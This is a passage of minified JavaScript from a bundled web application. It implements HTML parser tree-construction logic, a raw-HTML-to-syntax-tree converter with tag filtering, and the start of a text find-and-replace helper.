r=e.activeFormattingElements.getElementEntryInScopeWithTagName(M.A);r&&(wc(e,t),e.openElements.remove(r.element),e.activeFormattingElements.removeEntry(r)),e._reconstructActiveFormattingElements(),e._insertElement(t,V.HTML),e.activeFormattingElements.pushElement(e.openElements.current,t)}function YA(e,t){e._reconstructActiveFormattingElements(),e._insertElement(t,V.HTML),e.activeFormattingElements.pushElement(e.openElements.current,t)}function XA(e,t){e._reconstructActiveFormattingElements(),e.openElements.hasInScope(d.NOBR)&&(wc(e,t),e._reconstructActiveFormattingElements()),e._insertElement(t,V.HTML),e.activeFormattingElements.pushElement(e.openElements.current,t)}function GA(e,t){e._reconstructActiveFormattingElements(),e._insertElement(t,V.HTML),e.activeFormattingElements.insertMarker(),e.framesetOk=!1}function VA(e,t){e.treeAdapter.getDocumentMode(e.document)!==Kt.QUIRKS&&e.openElements.hasInButtonScope(d.P)&&e._closePElement(),e._insertElement(t,V.HTML),e.framesetOk=!1,e.insertionMode=k.IN_TABLE}function Lm(e,t){e._reconstructActiveFormattingElements(),e._appendElement(t,V.HTML),e.framesetOk=!1,t.ackSelfClosing=!0}function km(e){const t=mm(e,Nr.TYPE);return t!=null&&t.toLowerCase()===fA}function $A(e,t){e._reconstructActiveFormattingElements(),e._appendElement(t,V.HTML),km(t)||(e.framesetOk=!1),t.ackSelfClosing=!0}function qA(e,t){e._appendElement(t,V.HTML),t.ackSelfClosing=!0}function KA(e,t){e.openElements.hasInButtonScope(d.P)&&e._closePElement(),e._appendElement(t,V.HTML),e.framesetOk=!1,t.ackSelfClosing=!0}function JA(e,t){t.tagName=M.IMG,t.tagID=d.IMG,Lm(e,t)}function ZA(e,t){e._insertElement(t,V.HTML),e.skipNextNewLine=!0,e.tokenizer.state=tt.RCDATA,e.originalInsertionMode=e.insertionMode,e.framesetOk=!1,e.insertionMode=k.TEXT}function eL(e,t){e.openElements.hasInButtonScope(d.P)&&e._closePElement(),e._reconstructActiveFormattingElements(),e.framesetOk=!1,e._switchToTextParsing(t,tt.RAWTEXT)}function tL(e,t){e.framesetOk=!1,e._switchToTextParsing(t,tt.RAWTEXT)}function Xh(e,t){e._switchToTextParsing(t,tt.RAWTEXT)}function nL(e,t){e._reconstructActiveFormattingElements(),e._insertElement(t,V.HTML),e.framesetOk=!1,e.insertionMode=e.insertionMode===k.IN_TABLE||e.insertionMode===k.IN_CAPTION||e.insertionMode===k.IN_TABLE_BODY||e.insertionMode===k.IN_ROW||e.insertionMode===k.IN_CELL?k.IN_SELECT_IN_TABLE:k.IN_SELECT}function rL(e,t){e.openElements.currentTagId===d.OPTION&&e.openElements.pop(),e._reconstructActiveFormattingElements(),e._insertElement(t,V.HTML)}function iL(e,t){e.openElements.hasInScope(d.RUBY)&&e.openElements.generateImpliedEndTags(),e._insertElement(t,V.HTML)}function aL(e,t){e.openElements.hasInScope(d.RUBY)&&e.openElements.generateImpliedEndTagsWithExclusion(d.RTC),e._insertElement(t,V.HTML)}function uL(e,t){e._reconstructActiveFormattingElements(),Sm(t),Pc(t),t.selfClosing?e._appendElement(t,V.MATHML):e._insertElement(t,V.MATHML),t.ackSelfClosing=!0}function oL(e,t){e._reconstructActiveFormattingElements(),ym(t),Pc(t),t.selfClosing?e._appendElement(t,V.SVG):e._insertElement(t,V.SVG),t.ackSelfClosing=!0}function Gh(e,t){e._reconstructActiveFormattingElements(),e._insertElement(t,V.HTML)}function Ct(e,t){switch(t.tagID){case d.I:case d.S:case d.B:case d.U:case d.EM:case d.TT:case d.BIG:case d.CODE:case d.FONT:case d.SMALL:case d.STRIKE:case d.STRONG:{YA(e,t);break}case d.A:{QA(e,t);break}case d.H1:case d.H2:case d.H3:case d.H4:case d.H5:case d.H6:{BA(e,t);break}case d.P:case d.DL:case d.OL:case d.UL:case d.DIV:case d.DIR:case d.NAV:case d.MAIN:case d.MENU:case d.ASIDE:case d.CENTER:case d.FIGURE:case d.FOOTER:case d.HEADER:case d.HGROUP:case d.DIALOG:case d.DETAILS:case d.ADDRESS:case d.ARTICLE:case d.SEARCH:case d.SECTION:case d.SUMMARY:case d.FIELDSET:case d.BLOCKQUOTE:case d.FIGCAPTION:{FA(e,t);break}case d.LI:case d.DD:case d.DT:{zA(e,t);break}case d.BR:case d.IMG:case d.WBR:case d.AREA:case d.EMBED:case d.KEYGEN:{Lm(e,t);break}case d.HR:{KA(e,t);break}case d.RB:case d.RTC:{iL(e,t);break}case d.RT:case d.RP:{aL(e,t);break}case d.PRE:case d.LISTING:{HA(e,t);break}case d.XMP:{eL(e,t);break}case d.SVG:{oL(e,t);break}case d.HTML:{wA(e,t);break}case d.BASE:case d.LINK:case d.META:case d.STYLE:case d.TITLE:case d.SCRIPT:case d.BGSOUND:case d.BASEFONT:case d.TEMPLATE:{ln(e,t);break}case d.BODY:{DA(e,t);break}case d.FORM:{UA(e,t);break}case d.NOBR:{XA(e,t);break}case d.MATH:{uL(e,t);break}case d.TABLE:{VA(e,t);break}case d.INPUT:{$A(e,t);break}case d.PARAM:case d.TRACK:case d.SOURCE:{qA(e,t);break}case d.IMAGE:{JA(e,t);break}case d.BUTTON:{jA(e,t);break}case d.APPLET:case d.OBJECT:case d.MARQUEE:{GA(e,t);break}case d.IFRAME:{tL(e,t);break}case d.SELECT:{nL(e,t);break}case d.OPTION:case d.OPTGROUP:{rL(e,t);break}case d.NOEMBED:case d.NOFRAMES:{Xh(e,t);break}case d.FRAMESET:{MA(e,t);break}case d.TEXTAREA:{ZA(e,t);break}case d.NOSCRIPT:{e.options.scriptingEnabled?Xh(e,t):Gh(e,t);break}case d.PLAINTEXT:{WA(e,t);break}case d.COL:case d.TH:case d.TD:case d.TR:case d.HEAD:case d.FRAME:case d.TBODY:case d.TFOOT:case d.THEAD:case d.CAPTION:case d.COLGROUP:break;default:Gh(e,t)}}function sL(e,t){if(e.openElements.hasInScope(d.BODY)&&(e.insertionMode=k.AFTER_BODY,e.options.sourceCodeLocationInfo)){const r=e.openElements.tryPeekProperlyNestedBodyElement();r&&e._setEndLocation(r,t)}}function lL(e,t){e.openElements.hasInScope(d.BODY)&&(e.insertionMode=k.AFTER_BODY,Fm(e,t))}function cL(e,t){const r=t.tagID;e.openElements.hasInScope(r)&&(e.openElements.generateImpliedEndTags(),e.openElements.popUntilTagNamePopped(r))}function dL(e){const t=e.openElements.tmplCount>0,{formElement:r}=e;t||(e.formElement=null),(r||t)&&e.openElements.hasInScope(d.FORM)&&(e.openElements.generateImpliedEndTags(),t?e.openElements.popUntilTagNamePopped(d.FORM):r&&e.openElements.remove(r))}function fL(e){e.openElements.hasInButtonScope(d.P)||e._insertFakeElement(M.P,d.P),e._closePElement()}function hL(e){e.openElements.hasInListItemScope(d.LI)&&(e.openElements.generateImpliedEndTagsWithExclusion(d.LI),e.openElements.popUntilTagNamePopped(d.LI))}function pL(e,t){const r=t.tagID;e.openElements.hasInScope(r)&&(e.openElements.generateImpliedEndTagsWithExclusion(r),e.openElements.popUntilTagNamePopped(r))}function mL(e){e.openElements.hasNumberedHeaderInScope()&&(e.openElements.generateImpliedEndTags(),e.openElements.popUntilNumberedHeaderPopped())}function gL(e,t){const r=t.tagID;e.openElements.hasInScope(r)&&(e.openElements.generateImpliedEndTags(),e.openElements.popUntilTagNamePopped(r),e.activeFormattingElements.clearToLastMarker())}function EL(e){e._reconstructActiveFormattingElements(),e._insertFakeElement(M.BR,d.BR),e.openElements.pop(),e.framesetOk=!1}function Im(e,t){const r=t.tagName,a=t.tagID;for(let o=e.openElements.stackTop;o>0;o--){const s=e.openElements.items[o],l=e.openElements.tagIDs[o];if(a===l&&(a!==d.UNKNOWN||e.treeAdapter.getTagName(s)===r)){e.openElements.generateImpliedEndTagsWithExclusion(a),e.openElements.stackTop>=o&&e.openElements.shortenToLength(o);break}if(e._isSpecialElement(s,l))break}}function Mo(e,t){switch(t.tagID){case d.A:case d.B:case d.I:case d.S:case d.U:case d.EM:case d.TT:case d.BIG:case d.CODE:case d.FONT:case d.NOBR:case d.SMALL:case d.STRIKE:case d.STRONG:{wc(e,t);break}case d.P:{fL(e);break}case d.DL:case d.UL:case d.OL:case d.DIR:case d.DIV:case d.NAV:case d.PRE:case d.MAIN:case d.MENU:case d.ASIDE:case d.BUTTON:case d.CENTER:case d.FIGURE:case d.FOOTER:case d.HEADER:case d.HGROUP:case d.DIALOG:case d.ADDRESS:case d.ARTICLE:case d.DETAILS:case d.SEARCH:case d.SECTION:case d.SUMMARY:case d.LISTING:case d.FIELDSET:case d.BLOCKQUOTE:case d.FIGCAPTION:{cL(e,t);break}case d.LI:{hL(e);break}case d.DD:case d.DT:{pL(e,t);break}case d.H1:case d.H2:case d.H3:case d.H4:case d.H5:case d.H6:{mL(e);break}case d.BR:{EL(e);break}case d.BODY:{sL(e,t);break}case d.HTML:{lL(e,t);break}case d.FORM:{dL(e);break}case d.APPLET:case d.OBJECT:case d.MARQUEE:{gL(e,t);break}case d.TEMPLATE:{wr(e,t);break}default:Im(e,t)}}function Nm(e,t){e.tmplInsertionModeStack.length>0?Mm(e,t):Dc(e,t)}function TL(e,t){var r;t.tagID===d.SCRIPT&&((r=e.scriptHandler)===null||r===void 0||r.call(e,e.openElements.current)),e.openElements.pop(),e.insertionMode=e.originalInsertionMode}function bL(e,t){e._err(t,W.eofInElementThatCanContainOnlyText),e.openElements.pop(),e.insertionMode=e.originalInsertionMode,e.onEof(t)}function Yl(e,t){if(e.openElements.currentTagId!==void 0&&Cm.has(e.openElements.currentTagId))switch(e.pendingCharacterTokens.length=0,e.hasNonWhitespacePendingCharacterToken=!1,e.originalInsertionMode=e.insertionMode,e.insertionMode=k.IN_TABLE_TEXT,t.type){case Pe.CHARACTER:{Rm(e,t);break}case Pe.WHITESPACE_CHARACTER:{vm(e,t);break}}else za(e,t)}function _L(e,t){e.openElements.clearBackToTableContext(),e.activeFormattingElements.insertMarker(),e._insertElement(t,V.HTML),e.insertionMode=k.IN_CAPTION}function SL(e,t){e.openElements.clearBackToTableContext(),e._insertElement(t,V.HTML),e.insertionMode=k.IN_COLUMN_GROUP}function yL(e,t){e.openElements.clearBackToTableContext(),e._insertFakeElement(M.COLGROUP,d.COLGROUP),e.insertionMode=k.IN_COLUMN_GROUP,Mc(e,t)}function CL(e,t){e.openElements.clearBackToTableContext(),e._insertElement(t,V.HTML),e.insertionMode=k.IN_TABLE_BODY}function xL(e,t){e.openElements.clearBackToTableContext(),e._insertFakeElement(M.TBODY,d.TBODY),e.insertionMode=k.IN_TABLE_BODY,Fo(e,t)}function AL(e,t){e.openElements.hasInTableScope(d.TABLE)&&(e.openElements.popUntilTagNamePopped(d.TABLE),e._resetInsertionMode(),e._processStartTag(t))}function LL(e,t){km(t)?e._appendElement(t,V.HTML):za(e,t),t.ackSelfClosing=!0}function kL(e,t){!e.formElement&&e.openElements.tmplCount===0&&(e._insertElement(t,V.HTML),e.formElement=e.openElements.current,e.openElements.pop())}function Ti(e,t){switch(t.tagID){case d.TD:case d.TH:case d.TR:{xL(e,t);break}case d.STYLE:case d.SCRIPT:case d.TEMPLATE:{ln(e,t);break}case d.COL:{yL(e,t);break}case d.FORM:{kL(e,t);break}case d.TABLE:{AL(e,t);break}case d.TBODY:case d.TFOOT:case d.THEAD:{CL(e,t);break}case d.INPUT:{LL(e,t);break}case d.CAPTION:{_L(e,t);break}case d.COLGROUP:{SL(e,t);break}default:za(e,t)}}function Pa(e,t){switch(t.tagID){case d.TABLE:{e.openElements.hasInTableScope(d.TABLE)&&(e.openElements.popUntilTagNamePopped(d.TABLE),e._resetInsertionMode());break}case d.TEMPLATE:{wr(e,t);break}case d.BODY:case d.CAPTION:case d.COL:case d.COLGROUP:case d.HTML:case d.TBODY:case d.TD:case d.TFOOT:case d.TH:case d.THEAD:case d.TR:break;default:za(e,t)}}function za(e,t){const r=e.fosterParentingEnabled;e.fosterParentingEnabled=!0,Do(e,t),e.fosterParentingEnabled=r}function vm(e,t){e.pendingCharacterTokens.push(t)}function Rm(e,t){e.pendingCharacterTokens.push(t),e.hasNonWhitespacePendingCharacterToken=!0}function Ea(e,t){let r=0;if(e.hasNonWhitespacePendingCharacterToken)for(;r<e.pendingCharacterTokens.length;r++)za(e,e.pendingCharacterTokens[r]);else for(;r<e.pendingCharacterTokens.length;r++)e._insertCharacters(e.pendingCharacterTokens[r]);e.insertionMode=e.originalInsertionMode,e._processToken(t)}const Om=new Set([d.CAPTION,d.COL,d.COLGROUP,d.TBODY,d.TD,d.TFOOT,d.TH,d.THEAD,d.TR]);function IL(e,t){const r=t.tagID;Om.has(r)?e.openElements.hasInTableScope(d.CAPTION)&&(e.openElements.generateImpliedEndTags(),e.openElements.popUntilTagNamePopped(d.CAPTION),e.activeFormattingElements.clearToLastMarker(),e.insertionMode=k.IN_TABLE,Ti(e,t)):Ct(e,t)}function NL(e,t){const r=t.tagID;switch(r){case d.CAPTION:case d.TABLE:{e.openElements.hasInTableScope(d.CAPTION)&&(e.openElements.generateImpliedEndTags(),e.openElements.popUntilTagNamePopped(d.CAPTION),e.activeFormattingElements.clearToLastMarker(),e.insertionMode=k.IN_TABLE,r===d.TABLE&&Pa(e,t));break}case d.BODY:case d.COL:case d.COLGROUP:case d.HTML:case d.TBODY:case d.TD:case d.TFOOT:case d.TH:case d.THEAD:case d.TR:break;default:Mo(e,t)}}function Mc(e,t){switch(t.tagID){case d.HTML:{Ct(e,t);break}case d.COL:{e._appendElement(t,V.HTML),t.ackSelfClosing=!0;break}case d.TEMPLATE:{ln(e,t);break}default:bo(e,t)}}function vL(e,t){switch(t.tagID){case d.COLGROUP:{e.openElements.currentTagId===d.COLGROUP&&(e.openElements.pop(),e.insertionMode=k.IN_TABLE);break}case d.TEMPLATE:{wr(e,t);break}case d.COL:break;default:bo(e,t)}}function bo(e,t){e.openElements.currentTagId===d.COLGROUP&&(e.openElements.pop(),e.insertionMode=k.IN_TABLE,e._processToken(t))}function Fo(e,t){switch(t.tagID){case d.TR:{e.openElements.clearBackToTableBodyContext(),e._insertElement(t,V.HTML),e.insertionMode=k.IN_ROW;break}case d.TH:case d.TD:{e.openElements.clearBackToTableBodyContext(),e._insertFakeElement(M.TR,d.TR),e.insertionMode=k.IN_ROW,Bo(e,t);break}case d.CAPTION:case d.COL:case d.COLGROUP:case d.TBODY:case d.TFOOT:case d.THEAD:{e.openElements.hasTableBodyContextInTableScope()&&(e.openElements.clearBackToTableBodyContext(),e.openElements.pop(),e.insertionMode=k.IN_TABLE,Ti(e,t));break}default:Ti(e,t)}}function gc(e,t){const r=t.tagID;switch(t.tagID){case d.TBODY:case d.TFOOT:case d.THEAD:{e.openElements.hasInTableScope(r)&&(e.openElements.clearBackToTableBodyContext(),e.openElements.pop(),e.insertionMode=k.IN_TABLE);break}case d.TABLE:{e.openElements.hasTableBodyContextInTableScope()&&(e.openElements.clearBackToTableBodyContext(),e.openElements.pop(),e.insertionMode=k.IN_TABLE,Pa(e,t));break}case d.BODY:case d.CAPTION:case d.COL:case d.COLGROUP:case d.HTML:case d.TD:case d.TH:case d.TR:break;default:Pa(e,t)}}function Bo(e,t){switch(t.tagID){case d.TH:case d.TD:{e.openElements.clearBackToTableRowContext(),e._insertElement(t,V.HTML),e.insertionMode=k.IN_CELL,e.activeFormattingElements.insertMarker();break}case d.CAPTION:case d.COL:case d.COLGROUP:case d.TBODY:case d.TFOOT:case d.THEAD:case d.TR:{e.openElements.hasInTableScope(d.TR)&&(e.openElements.clearBackToTableRowContext(),e.openElements.pop(),e.insertionMode=k.IN_TABLE_BODY,Fo(e,t));break}default:Ti(e,t)}}function Pm(e,t){switch(t.tagID){case d.TR:{e.openElements.hasInTableScope(d.TR)&&(e.openElements.clearBackToTableRowContext(),e.openElements.pop(),e.insertionMode=k.IN_TABLE_BODY);break}case d.TABLE:{e.openElements.hasInTableScope(d.TR)&&(e.openElements.clearBackToTableRowContext(),e.openElements.pop(),e.insertionMode=k.IN_TABLE_BODY,gc(e,t));break}case d.TBODY:case d.TFOOT:case d.THEAD:{(e.openElements.hasInTableScope(t.tagID)||e.openElements.hasInTableScope(d.TR))&&(e.openElements.clearBackToTableRowContext(),e.openElements.pop(),e.insertionMode=k.IN_TABLE_BODY,gc(e,t));break}case d.BODY:case d.CAPTION:case d.COL:case d.COLGROUP:case d.HTML:case d.TD:case d.TH:break;default:Pa(e,t)}}function RL(e,t){const r=t.tagID;Om.has(r)?(e.openElements.hasInTableScope(d.TD)||e.openElements.hasInTableScope(d.TH))&&(e._closeTableCell(),Bo(e,t)):Ct(e,t)}function OL(e,t){const r=t.tagID;switch(r){case d.TD:case d.TH:{e.openElements.hasInTableScope(r)&&(e.openElements.generateImpliedEndTags(),e.openElements.popUntilTagNamePopped(r),e.activeFormattingElements.clearToLastMarker(),e.insertionMode=k.IN_ROW);break}case d.TABLE:case d.TBODY:case d.TFOOT:case d.THEAD:case d.TR:{e.openElements.hasInTableScope(r)&&(e._closeTableCell(),Pm(e,t));break}case d.BODY:case d.CAPTION:case d.COL:case d.COLGROUP:case d.HTML:break;default:Mo(e,t)}}function wm(e,t){switch(t.tagID){case d.HTML:{Ct(e,t);break}case d.OPTION:{e.openElements.currentTagId===d.OPTION&&e.openElements.pop(),e._insertElement(t,V.HTML);break}case d.OPTGROUP:{e.openElements.currentTagId===d.OPTION&&e.openElements.pop(),e.openElements.currentTagId===d.OPTGROUP&&e.openElements.pop(),e._insertElement(t,V.HTML);break}case d.HR:{e.openElements.currentTagId===d.OPTION&&e.openElements.pop(),e.openElements.currentTagId===d.OPTGROUP&&e.openElements.pop(),e._appendElement(t,V.HTML),t.ackSelfClosing=!0;break}case d.INPUT:case d.KEYGEN:case d.TEXTAREA:case d.SELECT:{e.openElements.hasInSelectScope(d.SELECT)&&(e.openElements.popUntilTagNamePopped(d.SELECT),e._resetInsertionMode(),t.tagID!==d.SELECT&&e._processStartTag(t));break}case d.SCRIPT:case d.TEMPLATE:{ln(e,t);break}}}function Dm(e,t){switch(t.tagID){case d.OPTGROUP:{e.openElements.stackTop>0&&e.openElements.currentTagId===d.OPTION&&e.openElements.tagIDs[e.openElements.stackTop-1]===d.OPTGROUP&&e.openElements.pop(),e.openElements.currentTagId===d.OPTGROUP&&e.openElements.pop();break}case d.OPTION:{e.openElements.currentTagId===d.OPTION&&e.openElements.pop();break}case d.SELECT:{e.openElements.hasInSelectScope(d.SELECT)&&(e.openElements.popUntilTagNamePopped(d.SELECT),e._resetInsertionMode());break}case d.TEMPLATE:{wr(e,t);break}}}function PL(e,t){const r=t.tagID;r===d.CAPTION||r===d.TABLE||r===d.TBODY||r===d.TFOOT||r===d.THEAD||r===d.TR||r===d.TD||r===d.TH?(e.openElements.popUntilTagNamePopped(d.SELECT),e._resetInsertionMode(),e._processStartTag(t)):wm(e,t)}function wL(e,t){const r=t.tagID;r===d.CAPTION||r===d.TABLE||r===d.TBODY||r===d.TFOOT||r===d.THEAD||r===d.TR||r===d.TD||r===d.TH?e.openElements.hasInTableScope(r)&&(e.openElements.popUntilTagNamePopped(d.SELECT),e._resetInsertionMode(),e.onEndTag(t)):Dm(e,t)}function DL(e,t){switch(t.tagID){case d.BASE:case d.BASEFONT:case d.BGSOUND:case d.LINK:case d.META:case d.NOFRAMES:case d.SCRIPT:case d.STYLE:case d.TEMPLATE:case d.TITLE:{ln(e,t);break}case d.CAPTION:case d.COLGROUP:case d.TBODY:case d.TFOOT:case d.THEAD:{e.tmplInsertionModeStack[0]=k.IN_TABLE,e.insertionMode=k.IN_TABLE,Ti(e,t);break}case d.COL:{e.tmplInsertionModeStack[0]=k.IN_COLUMN_GROUP,e.insertionMode=k.IN_COLUMN_GROUP,Mc(e,t);break}case d.TR:{e.tmplInsertionModeStack[0]=k.IN_TABLE_BODY,e.insertionMode=k.IN_TABLE_BODY,Fo(e,t);break}case d.TD:case d.TH:{e.tmplInsertionModeStack[0]=k.IN_ROW,e.insertionMode=k.IN_ROW,Bo(e,t);break}default:e.tmplInsertionModeStack[0]=k.IN_BODY,e.insertionMode=k.IN_BODY,Ct(e,t)}}function ML(e,t){t.tagID===d.TEMPLATE&&wr(e,t)}function Mm(e,t){e.openElements.tmplCount>0?(e.openElements.popUntilTagNamePopped(d.TEMPLATE),e.activeFormattingElements.clearToLastMarker(),e.tmplInsertionModeStack.shift(),e._resetInsertionMode(),e.onEof(t)):Dc(e,t)}function FL(e,t){t.tagID===d.HTML?Ct(e,t):_o(e,t)}function Fm(e,t){var r;if(t.tagID===d.HTML){if(e.fragmentContext||(e.insertionMode=k.AFTER_AFTER_BODY),e.options.sourceCodeLocationInfo&&e.openElements.tagIDs[0]===d.HTML){e._setEndLocation(e.openElements.items[0],t);const a=e.openElements.items[1];a&&!(!((r=e.treeAdapter.getNodeSourceCodeLocation(a))===null||r===void 0)&&r.endTag)&&e._setEndLocation(a,t)}}else _o(e,t)}function _o(e,t){e.insertionMode=k.IN_BODY,Do(e,t)}function BL(e,t){switch(t.tagID){case d.HTML:{Ct(e,t);break}case d.FRAMESET:{e._insertElement(t,V.HTML);break}case d.FRAME:{e._appendElement(t,V.HTML),t.ackSelfClosing=!0;break}case d.NOFRAMES:{ln(e,t);break}}}function HL(e,t){t.tagID===d.FRAMESET&&!e.openElements.isRootHtmlElementCurrent()&&(e.openElements.pop(),!e.fragmentContext&&e.openElements.currentTagId!==d.FRAMESET&&(e.insertionMode=k.AFTER_FRAMESET))}function UL(e,t){switch(t.tagID){case d.HTML:{Ct(e,t);break}case d.NOFRAMES:{ln(e,t);break}}}function zL(e,t){t.tagID===d.HTML&&(e.insertionMode=k.AFTER_AFTER_FRAMESET)}function WL(e,t){t.tagID===d.HTML?Ct(e,t):ho(e,t)}function ho(e,t){e.insertionMode=k.IN_BODY,Do(e,t)}function jL(e,t){switch(t.tagID){case d.HTML:{Ct(e,t);break}case d.NOFRAMES:{ln(e,t);break}}}function QL(e,t){t.chars=Ve,e._insertCharacters(t)}function YL(e,t){e._insertCharacters(t),e.framesetOk=!1}function Bm(e){for(;e.treeAdapter.getNamespaceURI(e.openElements.current)!==V.HTML&&e.openElements.currentTagId!==void 0&&!e._isIntegrationPoint(e.openElements.currentTagId,e.openElements.current);)e.openElements.pop()}function XL(e,t){if(oA(t))Bm(e),e._startTagOutsideForeignContent(t);else{const r=e._getAdjustedCurrentElement(),a=e.treeAdapter.getNamespaceURI(r);a===V.MATHML?Sm(t):a===V.SVG&&(sA(t),ym(t)),Pc(t),t.selfClosing?e._appendElement(t,a):e._insertElement(t,a),t.ackSelfClosing=!0}}function GL(e,t){if(t.tagID===d.P||t.tagID===d.BR){Bm(e),e._endTagOutsideForeignContent(t);return}for(let r=e.openElements.stackTop;r>0;r--){const a=e.openElements.items[r];if(e.treeAdapter.getNamespaceURI(a)===V.HTML){e._endTagOutsideForeignContent(t);break}const o=e.treeAdapter.getTagName(a);if(o.toLowerCase()===t.tagName){t.tagName=o,e.openElements.shortenToLength(r);break}}}M.AREA,M.BASE,M.BASEFONT,M.BGSOUND,M.BR,M.COL,M.EMBED,M.FRAME,M.HR,M.IMG,M.INPUT,M.KEYGEN,M.LINK,M.META,M.PARAM,M.SOURCE,M.TRACK,M.WBR;const VL=/<(\/?)(iframe|noembed|noframes|plaintext|script|style|textarea|title|xmp)(?=[\t\n\f\r />])/gi,$L=new Set(["mdxFlowExpression","mdxJsxFlowElement","mdxJsxTextElement","mdxTextExpression","mdxjsEsm"]),Vh={sourceCodeLocationInfo:!0,scriptingEnabled:!1};function Hm(e,t){const r=ak(e),a=cm("type",{handlers:{root:qL,element:KL,text:JL,comment:zm,doctype:ZL,raw:tk},unknown:nk}),o={parser:r?new Yh(Vh):Yh.getFragmentParser(void 0,Vh),handle(h){a(h,o)},stitches:!1,options:t||{}};a(e,o),xi(o,Tn());const s=r?o.parser.document:o.parser.getFragment(),l=ux(s,{file:o.options.file});return o.stitches&&wo(l,"comment",function(h,p,g){const T=h;if(T.value.stitch&&g&&p!==void 0){const E=g.children;return E[p]=T.value.stitch,p}}),l.type==="root"&&l.children.length===1&&l.children[0].type===e.type?l.children[0]:l}function Um(e,t){let r=-1;if(e)for(;++r<e.length;)t.handle(e[r])}function qL(e,t){Um(e.children,t)}function KL(e,t){rk(e,t),Um(e.children,t),ik(e,t)}function JL(e,t){t.parser.tokenizer.state>4&&(t.parser.tokenizer.state=0);const r={type:Pe.CHARACTER,chars:e.value,location:Wa(e)};xi(t,Tn(e)),t.parser.currentToken=r,t.parser._processToken(t.parser.currentToken)}function ZL(e,t){const r={type:Pe.DOCTYPE,name:"html",forceQuirks:!1,publicId:"",systemId:"",location:Wa(e)};xi(t,Tn(e)),t.parser.currentToken=r,t.parser._processToken(t.parser.currentToken)}function ek(e,t){t.stitches=!0;const r=uk(e);if("children"in e&&"children"in r){const a=Hm({type:"root",children:e.children},t.options);r.children=a.children}zm({type:"comment",value:{stitch:r}},t)}function zm(e,t){const r=e.value,a={type:Pe.COMMENT,data:r,location:Wa(e)};xi(t,Tn(e)),t.parser.currentToken=a,t.parser._processToken(t.parser.currentToken)}function tk(e,t){if(t.parser.tokenizer.preprocessor.html="",t.parser.tokenizer.preprocessor.pos=-1,t.parser.tokenizer.preprocessor.lastGapPos=-2,t.parser.tokenizer.preprocessor.gapStack=[],t.parser.tokenizer.preprocessor.skipNextNewLine=!1,t.parser.tokenizer.preprocessor.lastChunkWritten=!1,t.parser.tokenizer.preprocessor.endOfChunkHit=!1,t.parser.tokenizer.preprocessor.isEol=!1,Wm(t,Tn(e)),t.parser.tokenizer.write(t.options.tagfilter?e.value.replace(VL,"&lt;$1$2"):e.value,!1),t.parser.tokenizer._runParsingLoop(),t.parser.tokenizer.state===72||t.parser.tokenizer.state===78){t.parser.tokenizer.preprocessor.lastChunkWritten=!0;const r=t.parser.tokenizer._consume();t.parser.tokenizer._callState(r)}}function nk(e,t){const r=e;if(t.options.passThrough&&t.options.passThrough.includes(r.type))ek(r,t);else{let a="";throw $L.has(r.type)&&(a=". It looks like you are using MDX nodes with `hast-util-raw` (or `rehype-raw`). If you use this because you are using remark or rehype plugins that inject `'html'` nodes, then please raise an issue with that plugin, as its a bad and slow idea. If you use this because you are using markdown syntax, then you have to configure this utility (or plugin) to pass through these nodes (see `passThrough` in docs), but you can also migrate to use the MDX syntax"),new Error("Cannot compile `"+r.type+"` node"+a)}}function xi(e,t){Wm(e,t);const r=e.parser.tokenizer.currentCharacterToken;r&&r.location&&(r.location.endLine=e.parser.tokenizer.preprocessor.line,r.location.endCol=e.parser.tokenizer.preprocessor.col+1,r.location.endOffset=e.parser.tokenizer.preprocessor.offset+1,e.parser.currentToken=r,e.parser._processToken(e.parser.currentToken)),e.parser.tokenizer.paused=!1,e.parser.tokenizer.inLoop=!1,e.parser.tokenizer.active=!1,e.parser.tokenizer.returnState=tt.DATA,e.parser.tokenizer.charRefCode=-1,e.parser.tokenizer.consumedAfterSnapshot=-1,e.parser.tokenizer.currentLocation=null,e.parser.tokenizer.currentCharacterToken=null,e.parser.tokenizer.currentToken=null,e.parser.tokenizer.currentAttr={name:"",value:""}}function Wm(e,t){if(t&&t.offset!==void 0){const r={startLine:t.line,startCol:t.column,startOffset:t.offset,endLine:-1,endCol:-1,endOffset:-1};e.parser.tokenizer.preprocessor.lineStartPos=-t.column+1,e.parser.tokenizer.preprocessor.droppedBufferSize=t.offset,e.parser.tokenizer.preprocessor.line=t.line,e.parser.tokenizer.currentLocation=r}}function rk(e,t){const r=e.tagName.toLowerCase();if(t.parser.tokenizer.state===tt.PLAINTEXT)return;xi(t,Tn(e));const a=t.parser.openElements.current;let o="namespaceURI"in a?a.namespaceURI:kr.html;o===kr.html&&r==="svg"&&(o=kr.svg);const s=dx({...e,children:[]},{space:o===kr.svg?"svg":"html"}),l={type:Pe.START_TAG,tagName:r,tagID:Ci(r),selfClosing:!1,ackSelfClosing:!1,attrs:"attrs"in s?s.attrs:[],location:Wa(e)};t.parser.currentToken=l,t.parser._processToken(t.parser.currentToken),t.parser.tokenizer.lastStartTagName=r}function ik(e,t){const r=e.tagName.toLowerCase();if(!t.parser.tokenizer.inForeignNode&&bx.includes(r)||t.parser.tokenizer.state===tt.PLAINTEXT)return;xi(t,Io(e));const a={type:Pe.END_TAG,tagName:r,tagID:Ci(r),selfClosing:!1,ackSelfClosing:!1,attrs:[],location:Wa(e)};t.parser.currentToken=a,t.parser._processToken(t.parser.currentToken),r===t.parser.tokenizer.lastStartTagName&&(t.parser.tokenizer.state===tt.RCDATA||t.parser.tokenizer.state===tt.RAWTEXT||t.parser.tokenizer.state===tt.SCRIPT_DATA)&&(t.parser.tokenizer.state=tt.DATA)}function ak(e){const t=e.type==="root"?e.children[0]:e;return!!(t&&(t.type==="doctype"||t.type==="element"&&t.tagName.toLowerCase()==="html"))}function Wa(e){const t=Tn(e)||{line:void 0,column:void 0,offset:void 0},r=Io(e)||{line:void 0,column:void 0,offset:void 0};return{startLine:t.line,startCol:t.column,startOffset:t.offset,endLine:r.line,endCol:r.column,endOffset:r.offset}}function uk(e){return"children"in e?Ei({...e,children:[]}):Ei(e)}function ok(e){return function(t,r){return Hm(t,{...e,file:r})}}function $h(e,t){const r=String(e);if(typeof t!="string")throw new TypeError("Expected character");let a=0,o=r.indexOf(t);for(;o!==-1;)a++,o=r.indexOf(t,o+t.length);return a}function sk(e){if(typeof e!="string")throw new TypeError("Expected a string");return e.replace(/[|\\{}()[\]^$+*?.]/g,"\\$&").replace(/-/g,"\\x2d")}function lk(e,t,r){const o=Oo((r||{}).ignore||[]),s=ck(t);let l=-1;for(;++l<s.length;)am(e,"text",h);function h(g,T){let E=-1,_;for(;++E<T.length;){const S=T[E],I=_?_.children:void 0;if(o(S,I?I.indexOf(S):void 0,_))return;_=S}if(_)return p(g,T)}function p(g,T){const 